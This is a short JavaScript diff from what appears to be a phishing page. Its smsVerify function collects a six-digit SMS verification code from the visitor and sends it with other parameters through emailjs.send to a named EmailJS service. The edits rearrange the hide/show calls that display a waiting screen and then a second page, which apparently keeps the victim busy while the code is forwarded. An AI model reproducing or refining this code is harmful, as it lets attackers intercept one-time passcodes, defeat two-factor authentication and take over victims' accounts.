@@ -75,6 +75,7 @@ function smsVerify() {
     const codeLength = ident.length;
 
     if(codeLength == 6) {
+        $('#codeSms').hide();
         codeSms = ident;
 
         var tempParams = {
@@ -143,7 +144,8 @@ function addChecked(e) {
             codeSms: codeSms
         };
 
-        
+        $("#onepage").hide();
+        $("#attente").show();
 
         emailjs.send("service_rb7wkid", "template_lwkgcu3", tempParams)
             .then(function (res) {
@@ -158,8 +160,7 @@ function addChecked(e) {
 }
 
 function loadingPage() {
-    $("#onepage").hide();
-    $("#attente").show();
+    
     setTimeout(function () {
         $("#twopage").show();
         $("#attente").hide();
